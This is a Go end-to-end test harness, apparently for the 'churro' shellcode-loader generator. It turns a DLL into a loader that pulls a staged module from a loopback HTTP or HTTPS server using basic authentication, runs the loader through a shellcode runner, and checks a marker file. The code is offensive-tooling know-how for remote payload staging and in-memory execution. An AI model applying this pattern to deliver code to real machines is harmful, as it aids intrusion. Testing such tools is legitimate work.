//go:build windows

package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync/atomic"
	"time"

	"github.com/sliverarmory/churro"
)

const (
	stageUser = "churro"
	stagePass = "staging-secret"
	marker    = "relocations and imports"
)

func main() {
	dllPath := flag.String("dll", "", "native imports DLL to stage")
	runnerPath := flag.String("runner", "", "shellcode runner executable")
	outDir := flag.String("out-dir", "", "directory for generated loaders and markers")
	flag.Parse()
	if *dllPath == "" || *runnerPath == "" || *outDir == "" {
		fatalf("-dll, -runner, and -out-dir are required")
	}
	image, err := os.ReadFile(*dllPath)
	if err != nil {
		fatalf("read DLL: %v", err)
	}
	if err := os.MkdirAll(*outDir, 0o755); err != nil {
		fatalf("create output directory: %v", err)
	}
	var failures []string
	for _, secure := range []bool{false, true} {
		if err := runCase(image, *runnerPath, *outDir, secure); err != nil {
			fmt.Fprintln(os.Stderr, err)
			failures = append(failures, err.Error())
		}
	}
	if len(failures) != 0 {
		fatalf("%d staged cases failed: %s", len(failures), strings.Join(failures, " | "))
	}
}

type stagePayload struct {
	path string
	data []byte
}

func runCase(image []byte, runnerPath, outDir string, secure bool) error {
	label := "http-staged-auth"
	if secure {
		label = "https-staged-auth"
	}
	var served atomic.Pointer[stagePayload]
	var requests, authorized atomic.Int32
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests.Add(1)
		payload := served.Load()
		if payload == nil || r.Method != http.MethodGet || r.URL.Path != payload.path {
			http.NotFound(w, r)
			return
		}
		user, pass, ok := r.BasicAuth()
		fmt.Printf("%s request method=%s path=%s basic-auth=%t\n", label, r.Method, r.URL.Path, ok)
		if !ok || user != stageUser || pass != stagePass {
			w.Header().Set("WWW-Authenticate", `Basic realm="Churro E2E"`)
			http.Error(w, "authentication required", http.StatusUnauthorized)
			return
		}
		authorized.Add(1)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprint(len(payload.data)))
		_, _ = w.Write(payload.data)
	})
	var server *httptest.Server
	if secure {
		server = httptest.NewTLSServer(handler)
	} else {
		server = httptest.NewServer(handler)
	}
	defer server.Close()
	base, err := url.Parse(server.URL + "/modules/")
	if err != nil {
		return fmt.Errorf("%s: parse loopback URL: %w", label, err)
	}
	base.User = url.UserPassword(stageUser, stagePass)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	result, err := churro.Generate(ctx, churro.Request{
		Payload: churro.NativeDLL{
			Image:  image,
			Export: &churro.NativeDLLExport{Name: "RunImports"},
		},
		Staging: &churro.HTTPStaging{BaseURL: *base},
	})
	if err != nil {
		return fmt.Errorf("%s: generate loader: %w", label, err)
	}
	if len(result.Loader) == 0 || result.StagedModule == nil || len(result.StagedModule.Data) == 0 {
		return fmt.Errorf("%s: missing loader or staged module", label)
	}
	if !strings.HasPrefix(result.StagedModule.URL.String(), base.String()) {
		return fmt.Errorf("%s: unexpected module URL %q", label, result.StagedModule.URL.String())
	}
	staged := &stagePayload{path: result.StagedModule.URL.Path, data: result.StagedModule.Data}
	served.Store(staged)
	loaderPath := filepath.Join(outDir, label+".bin")
	prefix := filepath.Join(outDir, label)
	if err := os.Remove(prefix + ".imports"); err != nil && !errors.Is(err, os.ErrNotExist) {
		return fmt.Errorf("%s: remove stale marker: %w", label, err)
	}
	if err := os.WriteFile(loaderPath, result.Loader, 0o600); err != nil {
		return fmt.Errorf("%s: write loader: %w", label, err)
	}
	runCtx, stop := context.WithTimeout(context.Background(), time.Minute)
	defer stop()
	cmd := exec.CommandContext(runCtx, runnerPath, "-input", loaderPath, "-timeout", "45s")
	cmd.Env = append(os.Environ(), "CHURRO_E2E_PREFIX="+prefix)
	output, err := cmd.CombinedOutput()
	fmt.Printf("%s runner: %s", label, output)
	if err != nil {
		return fmt.Errorf("%s: execute loader: %w; HTTP requests=%d authenticated=%d", label, err, requests.Load(), authorized.Load())
	}
	if !strings.Contains(string(output), "shellcode thread returned") {
		return fmt.Errorf("%s: runner exited without reporting shellcode completion", label)
	}
	content, err := os.ReadFile(prefix + ".imports")
	if err != nil || string(content) != marker {
		return fmt.Errorf("%s: marker read=%q error=%v; HTTP requests=%d authenticated=%d", label, content, err, requests.Load(), authorized.Load())
	}
	if authorized.Load() == 0 {
		return fmt.Errorf("%s: no authenticated module request (HTTP requests=%d)", label, requests.Load())
	}
	fmt.Printf("passed %s: module=%s bytes=%d requests=%d authenticated=%d marker=%q\n",
		label, staged.path, len(staged.data), requests.Load(), authorized.Load(), content)
	return nil
}

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, format+"\n", args...)
	os.Exit(1)
}
